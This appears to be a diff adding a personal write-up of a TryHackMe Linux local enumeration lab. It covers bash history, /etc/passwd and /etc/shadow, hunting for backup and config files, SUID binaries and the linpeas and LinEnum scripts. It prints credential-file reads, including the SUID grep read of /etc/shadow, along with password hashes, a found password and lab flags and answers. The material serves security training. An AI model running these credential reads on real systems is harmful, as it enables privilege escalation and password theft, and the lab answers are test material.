@@ -364,3 +364,370 @@ alias ll='ls -alF'
 alias la='ls -A'
 alias l='ls -CF'
 ```
+```text
+# Add an "alert" alias for long running commands.  Use like so:
+```
+```text
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+```
+```text
+# Alias definitions.
+```
+```text
+# You may want to put all your additions into a separate file like
+```
+```text
+# ~/.bash_aliases, instead of adding them here directly.
+```
+```text
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+```
+```text
+# enable programmable completion features (you don't need to enable
+```
+```text
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+```
+```text
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+manager@py:~$ sudo -V
+sudo -V
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+manager@py:~$ sudo -l
+sudo -l
+[sudo] password for manager: manager
+
+Sorry, try again.
+[sudo] password for manager: 
+
+Sorry, try again.
+[sudo] password for manager: 
+
+sudo: 3 incorrect password attempts
+```
+```text
+manager@py:~$ uname -m
+uname -m
+x86_64
+```
+How would you print machine hardware name only?
+*uname -m*
+Where can you find bash history?
+https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Facilities
+*~/.bash_history*
+What's the flag?
+### Unit 3 - /etc
+Etc (etcetera) - unspecified additional items. Generally speaking, /etc folder is a central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.
+Each of the files located there has its own unique purpose that can be used to retrieve some sensitive information (such as passwords). The first thing you want to check is if you are able to read and write the files in /etc folder. Let's take a look at each file specifically and figure out the way you can use them for your enumeration process.
+> /etc/passwd
+This file stores the most essential information, required during the user login process. (It stores user account information). It's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
+Read the /etc/passwd file by running cat /etc/passwd and let's take a closer look.
+![](https://i.imgur.com/8vhblpQ.png)
+Each line of this file represents a different account, created in the system. Each field is separated with a colon (:) and carries a separate value.
+goldfish:x:1003:1003:,,,:/home/goldfish:/bin/bash
+1. (goldfish) - Username
+2. (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)
+3. (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.
+4. (1003) - Group ID (GID): Linux group ID
+5. (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)
+6. (/home/goldfish) - Home directory: A path to user's home directory that contains all the files related to them.
+7. (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin.
+How can this help? Well, if you have at least reading access to this file, you can easily enumerate all existing users, services and other accounts on the system. This can open a lot of vectors for you and lead to the desired root.
+Otherwise, if you have writing access to the /etc/passwd, you can easily get root creating a custom entry with root priveleges.
+(For more info: hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)
+> /etc/shadow
+The /etc/shadow file stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password. Those encrypted passwords usually have a pretty similar structure, making it easy for us to identify the encoding format and crack the hash to get the password.
+So, as you might have guessed, we can use /etc/shadow to retrieve different user passwords. In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges.
+cat /etc/shadow
+![](https://i.imgur.com/6DmDkRp.png)
+```text
+goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::
+```
+1. (goldfish) - Username
+2. ($6$1FiLdnFwT...) - Password : Encrypted password.
+Basic structure: **$id$salt$hashed**, The $id is the algorithm used On GNU/Linux as follows:
+- $1$ is MD5
+- $2a$ is Blowfish
+- $2y$ is Blowfish
+- $5$ is SHA-256
+- $6$ is SHA-512
+3. (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.
+4. (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).
+5. (99999) - Maximum: The maximum number of days the password is valid.
+6. (7) - Warn: The number of days before the user will be warned about changing their password.
+What can we get from here? Well, if you have reading permissions for this file, we can crack the encrypted password using one of the cracking methods.
+Just like with /etc/passwd, writeable permission can allow us to add a new root user by making a custom entry.
+> /etc/hosts
+/etc/hosts is a simple text file that allows users to assign a hostname to a specific IP address. Generally speaking, a hostname is a name that is assigned to a certain device on a network. It helps to distinguish one device from another. The hostname for a computer on a home network may be anything the user wants, for example, DesktopPC or MyLaptop.
+You can try editing your own /etc/hosts file by adding the 10.10.107.52 there like so:
+![](https://i.imgur.com/eGCyc19.png)
+From now on you'll be able to refer to the box as box.thm.
+Why do we need it? In real-world pentesting this file may reveal a local address of devices in the same network. It can help us to enumerate the network further.
+Can you read /etc/passwd on the box? (yay/nay)
+*yay*
+### Unit 4 - Find command and interesting files
+Since it's physically impossible to browse the whole filesystem by hand, we'll be using the find command for this purpose.
+I advise you to get familiar with the command in this room.
+The most important switches for us in our enumeration process are -type and -name.
+The first one allows us to limit the search towards files only -type f and the second one allows us to search for files by extensions using the wildcard (*).
+![](https://i.imgur.com/LE1vap1.png)
+Basically, what you want to do is to look for interesting log (.log) and configuration files (.conf). In addition to that, the system owner might be keeping backup files (.bak).
+Here's a list of file extensions you'd usually look for: [List](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/).
+The following list shows the most commons file extensions for linux:
+.a   : a static library ;
+.au    : an audio file ;
+.bin :    a) a binary image of a CD (usually a .cue file is also included); b) represents that the file is binary and is meant to be executed ;
+.bz2 :    A file compressed using bzip2 ;
+.c :    A C source file ;
+.conf :  A configuration file. System-wide config files reside in /etc while any user-specific configuration will be somewhere in the user’s home directory ;
+.cpp :  A C++ source file ;
+.deb :  a Debian Package;
+.diff :   A file containing instructions to apply a patch from a base version to another version of a single file or a project (such as the linux kernel);
+.dsc:   a Debian Source information file ;
+.ebuild : Bash script used to install programs through the portage system. Especially prevalent on Gentoo systems;
+.el :  Emacs Lisp code file;
+.elc :  Compiled Emacs Lisp code file;
+.gif :    a graphical or image file;
+.h :a C or C++ program language header file;
+.html/.htm  :   an HTML file;
+.iso :    A image (copy) of a CD-ROM or DVD in the ISO-9660 filesystem format;
+.jpg :    a graphical or image file, such as a photo or artwork;
+.ko :    The kernel module extension for the 2.6.x series kernel;
+.la :    A file created by libtool to aide in using the library;
+.lo :    The intermediate file of a library that is being compiled;
+.lock :    A lock file that prevents the use of another file;
+.log :    a system or program’s log file;
+.m4 :    M4 macro code file;
+.o :    1) The intermediate file of a program that is being compiled ; 2) The kernel module extension for a 2.4 series kernel ; 3)a program object file;
+.pdf :    an electronic image of a document;
+.php :     a PHP script;
+.pid :    Some programs write their process ID into a file with this extention;
+.pl :    a Perl script;
+.png :    a graphical or image file;
+.ps :    a PostScript file; formatted for printing;
+.py :    a Python script;
+.rpm :    an rpm package. See Distributions of Linux for a list of distributions that use rpms as a part of their package management system;
+.s :    An assembly source code file;
+.sh :    a shell script;
+.so :     a Shared Object, which is a shared library. This is the equivalent form of a Windows DLL file;
+.src  :    A source code file. Written in plain text, a source file must be compiled to be used;
+.sfs :    Squashfs filesystem used in the SFS Technology;
+.tar.bz2 , tbz2, tar.gz :     a compressed file per File Compression;
+.tcl :    a TCL script;
+.tgz :     a compressed file per File Compression. his may also denote a Slackware binary or source package;
+.txt :    a plain ASCII text file;
+.xbm :    an XWindows Bitmap image;
+.xpm :     an image file;
+.xcf.gz, xcf :  A GIMP image (native image format of the GIMP);
+.xwd :    a screenshot or image of a window taken with xwd;
+.zip :extension for files in ZIP format, a popular file compression format;
+.wav :    an audio file.
+```text
+manager@py:/$ find -type f -name "*.bak" 2>/dev/null
+find -type f -name "*.bak" 2>/dev/null
+./var/opt/passwords.bak
+./var/backups/shadow.bak
+./var/backups/passwd.bak
+./var/backups/gshadow.bak
+./var/backups/group.bak
+manager@py:/$ cat ./var/opt/passwords.bak
+cat ./var/opt/passwords.bak
+THMSkidyPass
+```
+What's the password you found?
+It's backed up
+*THMSkidyPass*
+```text
+manager@py:/$ find -type f -name "flag.conf" 2>/dev/null
+find -type f -name "flag.conf" 2>/dev/null
+./etc/sysconf/flag.conf
+manager@py:/$ cat ./etc/sysconf/flag.conf
+cat ./etc/sysconf/flag.conf
+```
+```text
+# Begin system conf 1.1.1.0
+## Developed by Swafox and Chad
+
+flag: thm{conf_file}
+```
+Did you find a flag?
+.conf
+Set User ID (SUID) is a type of permission that allows users to execute a file with the permissions of another user.
+Those files which have SUID permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found SUID bit enabled binaries, then those file/program/command can be run with root privileges.
+SUID abuse is a common privilege escalation technique that allows us to gain root access by executing a root-owned binary with SUID enabled.
+You can find all SUID file by executing this simple find command:
+find / -perm -u=s -type f 2>/dev/null
+-u=s searches files that are owned by the root user.
+-type f search for files, not directories
+After displaying all SUID files, compare them to a list on GTFObins to see if there's a way to abuse them to get root access.
+```text
+manager@py:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/su
+/bin/grep
+/bin/ntfs-3g
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/fusermount
+/usr/bin/chsh
+/usr/bin/arping
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/snap/core/4486/bin/mount
+/snap/core/4486/bin/ping
+/snap/core/4486/bin/ping6
+/snap/core/4486/bin/su
+/snap/core/4486/bin/umount
+/snap/core/4486/usr/bin/chfn
+/snap/core/4486/usr/bin/chsh
+/snap/core/4486/usr/bin/gpasswd
+/snap/core/4486/usr/bin/newgrp
+/snap/core/4486/usr/bin/passwd
+/snap/core/4486/usr/bin/sudo
+/snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/4486/usr/lib/openssh/ssh-keysign
+/snap/core/4486/usr/lib/snapd/snap-confine
+/snap/core/4486/usr/sbin/pppd
+
+looking through gtofbins there's grep SUID
+https://gtfobins.github.io/#+suid
+```
+Which SUID binary has a way to escalate your privileges on the box?
+*grep*
+```text
+manager@py:~/Desktop$ grep '' /etc/shadow
+grep '' /etc/shadow
+root:!:18362:0:99999:7:::
+daemon:*:17647:0:99999:7:::
+bin:*:17647:0:99999:7:::
+sys:*:17647:0:99999:7:::
+sync:*:17647:0:99999:7:::
+games:*:17647:0:99999:7:::
+man:*:17647:0:99999:7:::
+lp:*:17647:0:99999:7:::
+mail:*:17647:0:99999:7:::
+news:*:17647:0:99999:7:::
+uucp:*:17647:0:99999:7:::
+proxy:*:17647:0:99999:7:::
+www-data:*:17647:0:99999:7:::
+backup:*:17647:0:99999:7:::
+list:*:17647:0:99999:7:::
+irc:*:17647:0:99999:7:::
+gnats:*:17647:0:99999:7:::
+nobody:*:17647:0:99999:7:::
+systemd-network:*:17647:0:99999:7:::
+systemd-resolve:*:17647:0:99999:7:::
+syslog:*:17647:0:99999:7:::
+messagebus:*:17647:0:99999:7:::
+_apt:*:17647:0:99999:7:::
+uuidd:*:17647:0:99999:7:::
+avahi-autoipd:*:17647:0:99999:7:::
+usbmux:*:17647:0:99999:7:::
+dnsmasq:*:17647:0:99999:7:::
+rtkit:*:17647:0:99999:7:::
+speech-dispatcher:!:17647:0:99999:7:::
+whoopsie:*:17647:0:99999:7:::
+kernoops:*:17647:0:99999:7:::
+saned:*:17647:0:99999:7:::
+pulse:*:17647:0:99999:7:::
+avahi:*:17647:0:99999:7:::
+colord:*:17647:0:99999:7:::
+hplip:*:17647:0:99999:7:::
+geoclue:*:17647:0:99999:7:::
+gnome-initial-setup:*:17647:0:99999:7:::
+gdm:*:17647:0:99999:7:::
+sshd:*:18362:0:99999:7:::
+manager:$6$IL0a.UKt$nDPWg8EX0UKMZGJFITqSI48dmcnzww/5VgEnQHPlebWv6hoDWIg/D.qbdeewqnEYHdC.zcGduh3gG4aHb3A7m0:18478:0:99999:7:::
+```
+What's the payload you can use to read /etc/shadow with this SUID?
+https://gtfobins.github.io/gtfobins/grep/#suid
+*grep '' /etc/shadow*
+### [Bonus] - Port Forwarding
+According to Wikipedia, "Port forwarding is an application of network address translation (NAT) that redirects a communication request from one address and port number combination to another while the packets are traversing a network gateway, such as a router or firewall".
+Port forwarding not only allows you to bypass firewalls but also gives you an opportunity to enumerate some local services and processes running on the box.
+The Linux netstat command gives you a bunch of information about your network connections, the ports that are in use, and the processes using them. In order to see all TCP connections, execute netstat -at | less. This will give you a list of running processes that use TCP. From this point, you can easily enumerate running processes and gain some valuable information.
+netstat -tulpn will provide you a much nicer output with the most interesting data.
+Read more about port forwarding here: fumenoid.github.io/posts/port-forwarding
+Try using those commands on your system!
+### Unit 5 - Automating scripts
+Even though I, personally, dislike any automatic enumeration scripts, they are really important to the privilege escalation process as they help you to omit the 'human error' in your enum process.
+> Linpeas
+LinPEAS - Linux local Privilege Escalation Awesome Script (.sh) is a script that searches for possible paths to escalate privileges on Linux/ hosts.
+Linpeas automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root.
+They are different ways of getting the script on the box, but the most reliable one would be to first download the script on your system and then transfer it on the target.
+![](https://i.imgur.com/yAfGFDW.png)
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+After that, you get a nice output with all the vulnerable parts marked.
+> LinEnum
+The second tool on our list is LinEnum. It performs 'Scripted Local Linux Enumeration & Privilege Escalation Checks' and appears to be a bit easier than linpeas.
+You can get the script by running:
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Now, as you have two tools on the box, try running both of them and see if either of them shows something interesting!
+Please note: It's always a good idea to run multiple scripts separately and compare their output, as far as each one of them has their own specific scope of exploration.
+Got it!
+### Resources and what's next?
+Congratulations! You have successfully gone through Linux local enumeration!
+Now you can understand the main concepts of manual and automatic enumeration which will lead you towards obtaining root!
+We recommend you to continue your education by completing these awesome rooms, covering more in-depth privilege escalation:
+1. https://tryhackme.com/room/sudovulnsbypass
+2. https://tryhackme.com/room/commonlinuxprivesc
+3. https://tryhackme.com/room/linuxprivesc
+After doing so, you can practice your skills by completing these easy challenge machines:
+1. https://tryhackme.com/room/vulnversity
+2. https://tryhackme.com/room/basicpentestingjt
+3. https://tryhackme.com/room/bolt
+4. https://tryhackme.com/room/tartaraus
+Read the above and consider completing mentioned rooms.
+
+## Flags / Answers
+- ***thm{clear_the_history}***
+- ***thm{conf_file}***
+- ![](https://camo.githubusercontent.com/7bbb832ba8a724e6ba26a0e433f9933e85930539/68747470733a2f2f61736369696e656d612e6f72672f612f3235303533322e706e67)
+
+## Notes / Lessons Learned
+[[Python for Pentesters]]
+
